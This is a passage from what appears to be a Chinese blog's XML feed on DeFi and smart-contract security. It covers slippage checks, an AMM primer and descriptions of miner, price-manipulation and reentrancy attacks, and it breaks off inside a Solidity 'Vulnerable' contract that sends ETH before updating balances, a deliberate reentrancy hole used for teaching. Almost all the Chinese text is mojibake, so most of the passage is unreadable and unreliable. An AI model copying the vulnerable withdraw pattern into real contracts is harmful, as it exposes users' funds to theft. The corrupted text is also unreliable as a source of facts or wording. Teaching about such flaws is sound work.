href="#åœ¨èµ„é‡‘è½¬ç§»ç»™ç”¨æˆ·ä¹‹å‰çš„æœ€åä¸€æ­¥æ˜¯å¦å¼ºåˆ¶æ‰§è¡Œæ»‘ç‚¹å‚æ•°" class="headerlink" title="åœ¨èµ„é‡‘è½¬ç§»ç»™ç”¨æˆ·ä¹‹å‰çš„æœ€åä¸€æ­¥æ˜¯å¦å¼ºåˆ¶æ‰§è¡Œæ»‘ç‚¹å‚æ•°"></a>åœ¨èµ„é‡‘è½¬ç§»ç»™ç”¨æˆ·ä¹‹å‰çš„æœ€åä¸€æ­¥æ˜¯å¦å¼ºåˆ¶æ‰§è¡Œæ»‘ç‚¹å‚æ•°</h3><p>å¯¹ä¸­é—´äº¤æ¢å¼ºåˆ¶æ‰§è¡Œæ»‘ç‚¹å‚æ•°ï¼Œè€Œä¸æ˜¯æœ€åä¸€æ­¥ï¼Œå¯èƒ½ä¼šå¯¼è‡´ç”¨æˆ·æ”¶åˆ°çš„ä»£å¸å°‘äºå…¶æŒ‡å®šçš„æœ€å°å€¼</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ”»å‡»æè¿° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AMM(è‡ªåŠ¨åŒ–åšå¸‚å•†)</title>
      <link href="/2024/10/16/AMM-%E8%87%AA%E5%8A%A8%E5%8C%96%E5%81%9A%E5%B8%82%E5%95%86/"/>
      <url>/2024/10/16/AMM-%E8%87%AA%E5%8A%A8%E5%8C%96%E5%81%9A%E5%B8%82%E5%95%86/</url>
      
        <content type="html"><![CDATA[<h1 id="ç®€å•ä»‹ç»"><a href="#ç®€å•ä»‹ç»" class="headerlink" title="ç®€å•ä»‹ç»"></a>ç®€å•ä»‹ç»</h1><p>é•¿è¯çŸ­è¯´</p><p>ä½ å¯ä»¥å°†è‡ªåŠ¨åšå¸‚å•†è§†ä¸ºä¸€ä¸ªæœºå™¨äººï¼Œå®ƒæ€»æ˜¯æ„¿æ„ä¸ºä½ æŠ¥å‡ºä¸¤ç§èµ„äº§ä¹‹é—´çš„ä»·æ ¼ã€‚æœ‰äº›ä½¿ç”¨åƒ Uniswap è¿™æ ·çš„ç®€å•å…¬å¼ï¼Œè€Œ Curveã€Balancer å’Œå…¶ä»–å…¬å¸åˆ™ä½¿ç”¨æ›´å¤æ‚çš„å…¬å¼ã€‚</p><p>æ‚¨ä¸ä»…å¯ä»¥ä½¿ç”¨ AMM è¿›è¡Œæ— éœ€ä¿¡ä»»çš„äº¤æ˜“ï¼Œè¿˜å¯ä»¥é€šè¿‡å‘æµåŠ¨æ€§æ± æä¾›æµåŠ¨æ€§æ¥æˆä¸ºåº„å®¶ã€‚è¿™åŸºæœ¬ä¸Šå…è®¸ä»»ä½•äººæˆä¸ºäº¤æ˜“æ‰€çš„åšå¸‚å•†ï¼Œå¹¶é€šè¿‡æä¾›æµåŠ¨æ€§èµšå–è´¹ç”¨ã€‚</p><p>ç”±äº AMM ç®€å•æ˜“ç”¨ï¼Œå®ƒåœ¨ DeFi é¢†åŸŸçœŸæ­£å æ®äº†ä¸€å¸­ä¹‹åœ°ã€‚ä»¥è¿™ç§æ–¹å¼å®ç°å»ä¸­å¿ƒåŒ–åšå¸‚æ˜¯åŠ å¯†è´§å¸æ„¿æ™¯çš„æœ¬è´¨ã€‚</p><h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><p>å»ä¸­å¿ƒåŒ–é‡‘è (DeFi) åœ¨ä»¥å¤ªåŠå’Œ BNB æ™ºèƒ½é“¾ç­‰å…¶ä»–æ™ºèƒ½åˆçº¦å¹³å°ä¸Šå¼•èµ·äº†äººä»¬çš„æå¤§å…´è¶£ã€‚æ”¶ç›Šè€•ç§å·²æˆä¸ºä¸€ç§æµè¡Œçš„ä»£å¸åˆ†é…æ–¹å¼ï¼Œä»£å¸åŒ–çš„ BTC åœ¨ä»¥å¤ªåŠä¸Šä¸æ–­å¢é•¿ï¼Œé—ªç”µè´·äº¤æ˜“é‡ä¹Ÿåœ¨è“¬å‹ƒå‘å±•ã€‚</p><p>ä¸æ­¤åŒæ—¶ï¼Œåƒ Uniswap è¿™æ ·çš„è‡ªåŠ¨åšå¸‚å•†åè®®ç»å¸¸ä¼šçœ‹åˆ°æœ‰ç«äº‰åŠ›çš„äº¤æ˜“é‡ã€é«˜æµåŠ¨æ€§å’Œä¸æ–­å¢åŠ çš„ç”¨æˆ·æ•°é‡ã€‚</p><p>ä½†æ˜¯è¿™äº›äº¤æ˜“æ‰€æ˜¯å¦‚ä½•è¿ä½œçš„å‘¢ï¼Ÿä¸ºä»€ä¹ˆä¸ºæœ€æ–°çš„é£Ÿå“å¸å»ºç«‹å¸‚åœºå¦‚æ­¤å¿«é€Ÿå’Œå®¹æ˜“ï¼ŸAMM çœŸçš„èƒ½ä¸ä¼ ç»Ÿçš„è®¢å•ç°¿äº¤æ˜“æ‰€ç«äº‰å—ï¼Ÿè®©æˆ‘ä»¬æ¥ä¸€æ¢ç©¶ç«Ÿã€‚</p><h1 id="ä»€ä¹ˆæ˜¯è‡ªåŠ¨åŒ–åšå¸‚å•†ï¼ˆAMMï¼‰ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯è‡ªåŠ¨åŒ–åšå¸‚å•†ï¼ˆAMMï¼‰ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯è‡ªåŠ¨åŒ–åšå¸‚å•†ï¼ˆAMMï¼‰ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯è‡ªåŠ¨åŒ–åšå¸‚å•†ï¼ˆAMMï¼‰ï¼Ÿ</h1><p>è‡ªåŠ¨åšå¸‚å•† (AMM) æ˜¯ä¸€ç§å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ (DEX) åè®®ï¼Œå®ƒä¾é æ•°å­¦å…¬å¼æ¥ä¸ºèµ„äº§å®šä»·ã€‚ä¸ä¼ ç»Ÿäº¤æ˜“æ‰€ä½¿ç”¨è®¢å•ç°¿ä¸åŒï¼Œèµ„äº§æ˜¯æ ¹æ®å®šä»·ç®—æ³•æ¥å®šä»·çš„ã€‚</p><p>æ­¤å…¬å¼å¯èƒ½å› æ¯ä¸ªåè®®è€Œå¼‚ã€‚ä¾‹å¦‚ï¼ŒUniswap ä½¿ç”¨ x * y &#x3D; kï¼Œå…¶ä¸­ x æ˜¯æµåŠ¨æ€§æ± ä¸­ä¸€ç§ä»£å¸çš„æ•°é‡ï¼Œy æ˜¯å¦ä¸€ç§ä»£å¸çš„æ•°é‡ã€‚åœ¨è¿™ä¸ªå…¬å¼ä¸­ï¼Œk æ˜¯ä¸€ä¸ªå›ºå®šå¸¸æ•°ï¼Œè¿™æ„å‘³ç€æ± çš„æ€»æµåŠ¨æ€§å¿…é¡»å§‹ç»ˆä¿æŒä¸å˜ã€‚å…¶ä»– AMM å°†é’ˆå¯¹å…¶é’ˆå¯¹çš„ç‰¹å®šç”¨ä¾‹ä½¿ç”¨å…¶ä»–å…¬å¼ã€‚ç„¶è€Œï¼Œå®ƒä»¬ä¹‹é—´çš„ç›¸ä¼¼ä¹‹å¤„åœ¨äºå®ƒä»¬é€šè¿‡ç®—æ³•ç¡®å®šä»·æ ¼ã€‚å¦‚æœç°åœ¨æœ‰ç‚¹å›°æƒ‘ï¼Œåˆ«æ‹…å¿ƒï¼›å¸Œæœ›æœ€ç»ˆä¸€åˆ‡éƒ½ä¼šå¥½èµ·æ¥ã€‚</p><p>ä¼ ç»Ÿåšå¸‚å•†é€šå¸¸ä¸æ‹¥æœ‰å¤§é‡èµ„æºå’Œå¤æ‚ç­–ç•¥çš„å…¬å¸åˆä½œã€‚åšå¸‚å•†å¯å¸®åŠ©æ‚¨åœ¨åƒå¸å®‰è¿™æ ·çš„è®¢å•ç°¿äº¤æ˜“æ‰€è·å¾—ä¼˜æƒ ä»·æ ¼å’Œç´§å¯†çš„ä¹°å–ä»·å·®ã€‚è‡ªåŠ¨åŒ–åšå¸‚å•†å°†è¿™ä¸€è¿‡ç¨‹å»ä¸­å¿ƒåŒ–ï¼Œè®©ä»»ä½•äººéƒ½å¯ä»¥åœ¨åŒºå—é“¾ä¸Šåˆ›å»ºå¸‚åœºã€‚ä»–ä»¬ç©¶ç«Ÿæ˜¯å¦‚ä½•åšåˆ°è¿™ä¸€ç‚¹çš„ï¼Ÿè®©æˆ‘ä»¬ç»§ç»­é˜…è¯»ã€‚</p><h1 id="è‡ªåŠ¨åŒ–åšå¸‚å•†ï¼ˆAMMï¼‰å¦‚ä½•è¿ä½œï¼Ÿ"><a href="#è‡ªåŠ¨åŒ–åšå¸‚å•†ï¼ˆAMMï¼‰å¦‚ä½•è¿ä½œï¼Ÿ" class="headerlink" title="è‡ªåŠ¨åŒ–åšå¸‚å•†ï¼ˆAMMï¼‰å¦‚ä½•è¿ä½œï¼Ÿ"></a>è‡ªåŠ¨åŒ–åšå¸‚å•†ï¼ˆAMMï¼‰å¦‚ä½•è¿ä½œï¼Ÿ</h1><p>AMM çš„å·¥ä½œåŸç†ä¸è®¢å•ç°¿äº¤æ˜“æ‰€ç±»ä¼¼ï¼Œå› ä¸ºæœ‰äº¤æ˜“å¯¹ - ä¾‹å¦‚ ETH&#x2F;DAIã€‚ä½†æ˜¯ï¼Œæ‚¨ä¸éœ€è¦åœ¨å¦ä¸€è¾¹æœ‰äº¤æ˜“å¯¹æ‰‹ï¼ˆå¦ä¸€ä¸ªäº¤æ˜“è€…ï¼‰æ¥è¿›è¡Œäº¤æ˜“ã€‚ç›¸åï¼Œæ‚¨ä¸â€œä¸ºæ‚¨åˆ›é€ â€å¸‚åœºçš„æ™ºèƒ½åˆçº¦è¿›è¡Œäº¤äº’ã€‚</p><p>åœ¨åƒå¸å®‰ DEX è¿™æ ·çš„å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ï¼Œäº¤æ˜“ç›´æ¥å‘ç”Ÿåœ¨ç”¨æˆ·é’±åŒ…ä¹‹é—´ã€‚å¦‚æœæ‚¨åœ¨å¸å®‰ DEX ä¸Šç”¨ BUSD å–å‡º BNBï¼Œé‚£ä¹ˆäº¤æ˜“çš„å¦ä¸€ç«¯ä¹Ÿä¼šæœ‰äººç”¨ä»–ä»¬çš„ BUSD è´­ä¹° BNBã€‚æˆ‘ä»¬å¯ä»¥ç§°ä¹‹ä¸ºç‚¹å¯¹ç‚¹ (P2P) äº¤æ˜“ã€‚</p><p>ç›¸æ¯”ä¹‹ä¸‹ï¼Œä½ å¯ä»¥å°† AMM è§†ä¸ºç‚¹å¯¹ç‚¹åˆçº¦ (P2C)ã€‚äº¤æ˜“å‘ç”Ÿåœ¨ç”¨æˆ·å’Œåˆçº¦ä¹‹é—´ï¼Œå› æ­¤ä¸éœ€è¦ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„äº¤æ˜“å¯¹æ‰‹ã€‚ç”±äºæ²¡æœ‰è®¢å•ç°¿ï¼ŒAMM ä¸Šä¹Ÿæ²¡æœ‰è®¢å•ç±»å‹ã€‚ä½ æƒ³ä¹°æˆ–å–çš„èµ„äº§çš„ä»·æ ¼ç”±å…¬å¼å†³å®šã€‚ä¸è¿‡å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæœªæ¥çš„ä¸€äº› AMM è®¾è®¡å¯èƒ½ä¼šæŠµæ¶ˆè¿™ä¸€é™åˆ¶ã€‚</p><p>æ‰€ä»¥ä¸éœ€è¦äº¤æ˜“å¯¹æ‰‹ï¼Œä½†è¿˜æ˜¯å¾—æœ‰äººåˆ›é€ å¸‚åœºï¼Œå¯¹å§ï¼Ÿæ²¡é”™ã€‚æ™ºèƒ½åˆçº¦ä¸­çš„æµåŠ¨æ€§ä»ç„¶éœ€è¦ç”±è¢«ç§°ä¸ºæµåŠ¨æ€§æä¾›è€… (LP) çš„ç”¨æˆ·æä¾›ã€‚</p><h1 id="ä»€ä¹ˆæ˜¯æµåŠ¨èµ„é‡‘æ± ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯æµåŠ¨èµ„é‡‘æ± ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯æµåŠ¨èµ„é‡‘æ± ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯æµåŠ¨èµ„é‡‘æ± ï¼Ÿ</h1><p>what is a liquidity pool</p><p>æµåŠ¨æ€§æä¾›è€… (LP) å‘æµåŠ¨æ€§æ± ä¸­æ·»åŠ èµ„é‡‘ã€‚ä½ å¯ä»¥å°†æµåŠ¨æ€§æ± è§†ä¸ºäº¤æ˜“è€…å¯ä»¥è¿›è¡Œäº¤æ˜“çš„ä¸€å¤§ç¬”èµ„é‡‘ã€‚ä½œä¸ºå‘åè®®æä¾›æµåŠ¨æ€§çš„å›æŠ¥ï¼ŒLP å¯ä»¥ä»å…¶æ± ä¸­å‘ç”Ÿçš„äº¤æ˜“ä¸­èµšå–è´¹ç”¨ã€‚åœ¨ Uniswap çš„æƒ…å†µä¸‹ï¼ŒLP å°†ç­‰å€¼çš„ä¸¤ä¸ªä»£å¸ï¼ˆä¾‹å¦‚ï¼Œ50% çš„ ETH å’Œ 50% çš„ DAIï¼‰å­˜å…¥ ETH&#x2F;DAI æ± ã€‚</p><p>ç­‰ç­‰ï¼Œæ‰€ä»¥ä»»ä½•äººéƒ½å¯ä»¥æˆä¸ºåšå¸‚å•†ï¼Ÿç¡®å®å¦‚æ­¤ï¼å‘æµåŠ¨æ€§æ± ä¸­æ·»åŠ èµ„é‡‘éå¸¸å®¹æ˜“ã€‚å¥–åŠ±ç”±åè®®å†³å®šã€‚ä¾‹å¦‚ï¼ŒUniswap v2 å‘äº¤æ˜“è€…æ”¶å– 0.3% çš„è´¹ç”¨ï¼Œè¿™äº›è´¹ç”¨ç›´æ¥æµå‘ LPã€‚å…¶ä»–å¹³å°æˆ–åˆ†å‰å¯èƒ½ä¼šæ”¶å–è¾ƒä½çš„è´¹ç”¨ï¼Œä»¥å¸å¼•æ›´å¤šæµåŠ¨æ€§æä¾›è€…åŠ å…¥å…¶æ± å­ã€‚</p><p>ä¸ºä»€ä¹ˆå¸å¼•æµåŠ¨æ€§å¾ˆé‡è¦ï¼Ÿæ ¹æ® AMM çš„å·¥ä½œæ–¹å¼ï¼Œæ± ä¸­çš„æµåŠ¨æ€§è¶Šå¤šï¼Œå¤§é¢è®¢å•å¯èƒ½äº§ç”Ÿçš„æ»‘ç‚¹å°±è¶Šå°‘ã€‚è¿™åè¿‡æ¥å¯èƒ½ä¼šå¸å¼•æ›´å¤šäº¤æ˜“é‡åˆ°å¹³å°ï¼Œç­‰ç­‰ã€‚</p><p>æ»‘ç‚¹é—®é¢˜ä¼šå› ä¸åŒçš„ AMM è®¾è®¡è€Œæœ‰æ‰€ä¸åŒï¼Œä½†è¿™ç»å¯¹æ˜¯éœ€è¦æ³¨æ„çš„ã€‚è¯·è®°ä½ï¼Œå®šä»·æ˜¯ç”±ç®—æ³•å†³å®šçš„ã€‚ç®€è€Œè¨€ä¹‹ï¼Œå®ƒå–å†³äºäº¤æ˜“åæµåŠ¨æ€§æ± ä¸­ä»£å¸ä¹‹é—´çš„æ¯”ç‡å˜åŒ–ç¨‹åº¦ã€‚å¦‚æœæ¯”ç‡å˜åŒ–å¹…åº¦å¾ˆå¤§ï¼Œå°±ä¼šå‡ºç°å¤§é‡æ»‘ç‚¹ã€‚</p><p>æ›´è¿›ä¸€æ­¥è¯´ï¼Œå‡è®¾ä½ æƒ³è´­ä¹° Uniswap ä¸Š ETH&#x2F;DAI æ± ä¸­çš„æ‰€æœ‰ ETHã€‚ä½ åšä¸åˆ°ï¼ä½ å¿…é¡»ä¸ºæ¯ä¸ªé¢å¤–çš„ ETH æ”¯ä»˜è¶Šæ¥è¶Šé«˜çš„æº¢ä»·ï¼Œä½†ä»ç„¶æ— æ³•ä»æ± ä¸­å…¨éƒ¨è´­ä¹°ã€‚ä¸ºä»€ä¹ˆï¼Ÿè¿™æ˜¯å› ä¸ºå…¬å¼ x * y &#x3D; kã€‚å¦‚æœ x æˆ– y ä¸ºé›¶ï¼Œæ„å‘³ç€æ± ä¸­çš„ ETH æˆ– DAI ä¸ºé›¶ï¼Œåˆ™è¯¥ç­‰å¼ä¸å†æœ‰æ„ä¹‰ã€‚</p><p>ä½†è¿™å¹¶ä¸æ˜¯å…³äº AMM å’ŒæµåŠ¨æ€§æ± çš„å®Œæ•´æ•…äº‹ã€‚åœ¨ä¸º AMM æä¾›æµåŠ¨æ€§æ—¶ï¼Œä½ è¿˜éœ€è¦è®°ä½å¦ä¸€ä»¶äº‹â€”â€”æ— å¸¸æŸå¤±ã€‚</p><h1 id="ä»€ä¹ˆæ˜¯æ— å¸¸æŸå¤±ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯æ— å¸¸æŸå¤±ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯æ— å¸¸æŸå¤±ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯æ— å¸¸æŸå¤±ï¼Ÿ</h1><p>æ— å¸¸æŸå¤±æ˜¯æŒ‡å°†å­˜å…¥çš„ä»£å¸å­˜å…¥æ± åå…¶ä»·æ ¼æ¯”ç‡å‘ç”Ÿå˜åŒ–çš„æƒ…å†µã€‚å˜åŒ–è¶Šå¤§ï¼Œæ— å¸¸æŸå¤±è¶Šå¤§ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆ AMM æœ€é€‚åˆä½¿ç”¨å…·æœ‰ç›¸ä¼¼ä»·å€¼çš„ä»£å¸å¯¹ï¼ˆä¾‹å¦‚ç¨³å®šå¸æˆ–åŒ…è£…ä»£å¸ï¼‰ã€‚å¦‚æœè¯¥å¯¹ä¹‹é—´çš„ä»·æ ¼æ¯”ç‡ä¿æŒåœ¨ç›¸å¯¹è¾ƒå°çš„èŒƒå›´å†…ï¼Œåˆ™æ— å¸¸æŸå¤±ä¹Ÿå¯ä»¥å¿½ç•¥ä¸è®¡ã€‚</p><p>å¦ä¸€æ–¹é¢ï¼Œå¦‚æœæ¯”ç‡å˜åŒ–å¾ˆå¤§ï¼ŒæµåŠ¨æ€§æä¾›è€…å¯èƒ½æœ€å¥½åªæ˜¯æŒæœ‰ä»£å¸ï¼Œè€Œä¸æ˜¯å‘æ± å­é‡Œæ·»åŠ èµ„é‡‘ã€‚å³ä¾¿å¦‚æ­¤ï¼Œåƒ ETH&#x2F;DAI è¿™æ ·å®¹æ˜“é­å—æ— å¸¸æŸå¤±çš„ Uniswap æ± å­ä¹Ÿå› å®ƒä»¬ç´¯ç§¯çš„äº¤æ˜“è´¹è€Œç›ˆåˆ©ã€‚</p><p>è¯è™½å¦‚æ­¤ï¼Œæ— å¸¸æŸå¤±å¹¶ä¸æ˜¯è¿™ç§ç°è±¡çš„å¥½åå­—ã€‚â€œæ— å¸¸â€å‡è®¾å¦‚æœèµ„äº§æ¢å¤åˆ°æœ€åˆå­˜å…¥æ—¶çš„ä»·æ ¼ï¼ŒæŸå¤±å°±ä¼šå‡è½»ã€‚ç„¶è€Œï¼Œå¦‚æœä½ ä»¥ä¸å­˜å…¥æ—¶ä¸åŒçš„ä»·æ ¼æ¯”ç‡æå–èµ„é‡‘ï¼ŒæŸå¤±å°†æ˜¯æ°¸ä¹…æ€§çš„ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œäº¤æ˜“è´¹å¯èƒ½ä¼šå‡è½»æŸå¤±ï¼Œä½†è€ƒè™‘é£é™©ä»ç„¶å¾ˆé‡è¦ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> åŸºç¡€çŸ¥è¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çŸ¿å·¥æ”»å‡»</title>
      <link href="/2024/10/16/%E7%9F%BF%E5%B7%A5%E6%94%BB%E5%87%BB/"/>
      <url>/2024/10/16/%E7%9F%BF%E5%B7%A5%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h4 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h4><p> çŸ¿å·¥å¯ä»¥éªŒè¯äº¤æ˜“å¹¶å°†å®ƒæ·»åŠ åˆ°åŒºå—é“¾ä¸­ï¼Œæ“çºµå“ˆå¸Œæˆ–è€…æ—¶æ—¶é—´æˆ³ç­‰åŒºå—å±æ€§æ¥å½±å“åˆçº¦çš„æ‰§è¡Œæˆ–ç»“æœ</p><h4 id="ä¸¾ä¾‹"><a href="#ä¸¾ä¾‹" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h4><p> æ˜¯å¦æ˜æ™ºä½¿ç”¨äº†block.timestampï¼Œå°¤å…¶æ˜¯å¯¹äºè¾ƒé•¿çš„é—´éš”ï¼Œblock.timestampå¯ä»¥è¢«çŸ¿å·¥å†å¾ˆå°çš„ç¨‹åº¦ä¸Šæ“çºµï¼Œå½±åˆºä¾èµ–å®ƒè¿›è¡Œè®¡ç®—æ—¶å¯èƒ½ä¼šæœ‰é£é™©</p><h2 id="ä»·æ ¼æ“æ§æ”»å‡»"><a href="#ä»·æ ¼æ“æ§æ”»å‡»" class="headerlink" title="ä»·æ ¼æ“æ§æ”»å‡»"></a>ä»·æ ¼æ“æ§æ”»å‡»</h2><h4 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h4><p> æ”»å‡»è€…æ•…æ„æ”¹å˜å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€çš„èµ„äº§ä»·æ ¼ï¼Œé€šå¸¸æ˜¯ä¸ºäº†ä¾èµ–åˆ©ç”¨åˆçº¦æˆ–è€…äº¤æ˜“</p><h4 id="ä¸¾ä¾‹-1"><a href="#ä¸¾ä¾‹-1" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h4><p>å¦‚æœä»·æ ¼æˆ–èµ„äº§ä¹‹é—´çš„æ±‡ç‡æ˜¯ä»ä½™é¢æ¯”ç‡å¾—å‡ºçš„ï¼Œåˆ™å¯ä»¥å¯¹å…¶è¿›è¡Œæ“çºµã€‚é—ªç”µè´·å’Œæèµ æ˜¯ä¼—æ‰€å‘¨çŸ¥çš„ç”¨äºæ“çºµä»·æ ¼çš„æ”»å‡»åª’ä»‹ã€‚</p><h2 id="é‡å…¥æ”»å‡»"><a href="#é‡å…¥æ”»å‡»" class="headerlink" title="é‡å…¥æ”»å‡»"></a>é‡å…¥æ”»å‡»</h2><p>é‡å…¥æ”»å‡»æ˜¯ä¸€ç§é’ˆå¯¹æ™ºèƒ½åˆçº¦çš„å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…åˆ©ç”¨åˆçº¦åœ¨æ‰§è¡ŒæœŸé—´çš„çŠ¶æ€ä¸ä¸€è‡´æ€§ï¼Œé€šè¿‡å¤šæ¬¡è°ƒç”¨åˆçº¦çš„æŸä¸ªå‡½æ•°ï¼Œä»è€Œå¯¼è‡´èµ„é‡‘æˆ–æ•°æ®çš„å¼‚å¸¸æŸå¤±ã€‚ä¸‹é¢å°†è¯¦ç»†ç»†åˆ†é‡å…¥æ”»å‡»çš„ç±»å‹ï¼Œå¹¶é€šè¿‡å…·ä½“ç¤ºä¾‹è¿›è¡Œè¯´æ˜ã€‚</p><h3 id="å•ä¸ªåˆçº¦é‡å…¥æ”»å‡»"><a href="#å•ä¸ªåˆçº¦é‡å…¥æ”»å‡»" class="headerlink" title="å•ä¸ªåˆçº¦é‡å…¥æ”»å‡»"></a>å•ä¸ªåˆçº¦é‡å…¥æ”»å‡»</h3><h4 id="æ¼æ´æè¿°ï¼š"><a href="#æ¼æ´æè¿°ï¼š" class="headerlink" title="æ¼æ´æè¿°ï¼š"></a>æ¼æ´æè¿°ï¼š</h4><p>æ”»å‡»è€…åˆ©ç”¨åˆçº¦ä¸­çš„æ¼æ´ï¼Œåœ¨åŒä¸€åˆçº¦å†…é‡å¤è°ƒç”¨å‡½æ•°ï¼Œå¯¼è‡´çŠ¶æ€ä¸ä¸€è‡´æˆ–èµ„é‡‘æŸå¤±ã€‚</p><h4 id="ä¸¾ä¾‹ï¼š"><a href="#ä¸¾ä¾‹ï¼š" class="headerlink" title="ä¸¾ä¾‹ï¼š"></a>ä¸¾ä¾‹ï¼š</h4><p>æŸä¸ªåˆçº¦å…è®¸ç”¨æˆ·æå–èµ„é‡‘ï¼Œæ”»å‡»è€…åˆ©ç”¨é‡å…¥æ¼æ´åœ¨æç°è¿‡ç¨‹ä¸­å¤šæ¬¡è°ƒç”¨æç°å‡½æ•°ï¼Œå¯¼è‡´è¶…è¿‡è´¦æˆ·ä½™é¢çš„æå–ã€‚</p><h3 id="è·¨åˆçº¦é‡å…¥æ”»å‡»"><a href="#è·¨åˆçº¦é‡å…¥æ”»å‡»" class="headerlink" title="è·¨åˆçº¦é‡å…¥æ”»å‡»"></a>è·¨åˆçº¦é‡å…¥æ”»å‡»</h3><h4 id="æ¼æ´æè¿°ï¼š-1"><a href="#æ¼æ´æè¿°ï¼š-1" class="headerlink" title="æ¼æ´æè¿°ï¼š"></a>æ¼æ´æè¿°ï¼š</h4><p>æ”»å‡»è€…é¦–å…ˆè°ƒç”¨ä¸€ä¸ªåˆçº¦çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°å†è°ƒç”¨å¦ä¸€ä¸ªåˆçº¦çš„å‡½æ•°ï¼Œç„¶åå†é€šè¿‡å›è°ƒå†æ¬¡è°ƒç”¨åŸåˆçº¦ï¼Œé€ æˆå¤šæ¬¡æ‰§è¡Œã€‚</p><h4 id="ä¸¾ä¾‹ï¼š-1"><a href="#ä¸¾ä¾‹ï¼š-1" class="headerlink" title="ä¸¾ä¾‹ï¼š"></a>ä¸¾ä¾‹ï¼š</h4><p>æ”»å‡»è€…é¦–å…ˆé€šè¿‡ä¸€ä¸ªåˆçº¦è°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œè¯¥å‡½æ•°åœ¨æ‰§è¡Œæ—¶åˆè°ƒç”¨äº†å¦ä¸€ä¸ªåˆçº¦çš„æç°åŠŸèƒ½ï¼Œå†é€šè¿‡è¯¥åˆçº¦çš„å›è°ƒå†æ¬¡æ‰§è¡Œæå–ã€‚</p><h3 id="å¯é‡å…¥åˆçº¦"><a href="#å¯é‡å…¥åˆçº¦" class="headerlink" title="å¯é‡å…¥åˆçº¦"></a>å¯é‡å…¥åˆçº¦</h3><h4 id="æ¼æ´æè¿°ï¼š-2"><a href="#æ¼æ´æè¿°ï¼š-2" class="headerlink" title="æ¼æ´æè¿°ï¼š"></a>æ¼æ´æè¿°ï¼š</h4><p>æ”»å‡»è€…èƒ½å¤Ÿåˆ©ç”¨åˆçº¦åœ¨æ‰§è¡ŒæœŸé—´ä¿æŒçš„çŠ¶æ€ï¼Œé€šè¿‡åˆçº¦ä¸­çš„é€»è¾‘æ¼æ´è¿›è¡Œå¤šæ¬¡æ“ä½œã€‚</p><h4 id="ä¸¾ä¾‹ï¼š-2"><a href="#ä¸¾ä¾‹ï¼š-2" class="headerlink" title="ä¸¾ä¾‹ï¼š"></a>ä¸¾ä¾‹ï¼š</h4><p>æŸåˆçº¦åœ¨å¤„ç†èµ„é‡‘è½¬ç§»æ—¶æœªèƒ½æ­£ç¡®æ›´æ–°ä½™é¢ï¼Œå¯¼è‡´æ”»å‡»è€…èƒ½å¤Ÿå¤šæ¬¡è°ƒç”¨å¹¶æå–èµ„é‡‘ã€‚</p><h3 id="ä¸å¯é‡å…¥åˆçº¦"><a href="#ä¸å¯é‡å…¥åˆçº¦" class="headerlink" title="ä¸å¯é‡å…¥åˆçº¦"></a>ä¸å¯é‡å…¥åˆçº¦</h3><h4 id="æ¼æ´æè¿°ï¼š-3"><a href="#æ¼æ´æè¿°ï¼š-3" class="headerlink" title="æ¼æ´æè¿°ï¼š"></a>æ¼æ´æè¿°ï¼š</h4><p>è®¾è®¡ä¸Šé˜²æ­¢é‡å…¥ï¼Œä½†å¯èƒ½ç”±äºå¤–éƒ¨åˆçº¦çš„é€»è¾‘æ¼æ´è€Œè¢«æ”»å‡»ã€‚</p><h4 id="ä¸¾ä¾‹ï¼š-3"><a href="#ä¸¾ä¾‹ï¼š-3" class="headerlink" title="ä¸¾ä¾‹ï¼š"></a>ä¸¾ä¾‹ï¼š</h4><p>å¦‚æœåˆçº¦è°ƒç”¨äº†ä¸å®‰å…¨çš„å¤–éƒ¨åˆçº¦ï¼Œè€Œè¯¥å¤–éƒ¨åˆçº¦çš„é€»è¾‘å­˜åœ¨é‡å…¥æ¼æ´ï¼Œä¾ç„¶å¯èƒ½å¯¼è‡´æ”»å‡»ã€‚</p><ol start="2"><li>é‡å…¥æ”»å‡»ç¤ºä¾‹<br>2.1 å•åˆçº¦é‡å…¥æ”»å‡»ç¤ºä¾‹<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vulnerable &#123;</span><br><span class="line">    mapping(address =&amp;gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint amount) public &#123;</span><br><span class="line">        require(balances[msg.sender] &amp;gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line">        // è°ƒç”¨å¤–éƒ¨åˆçº¦</span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, 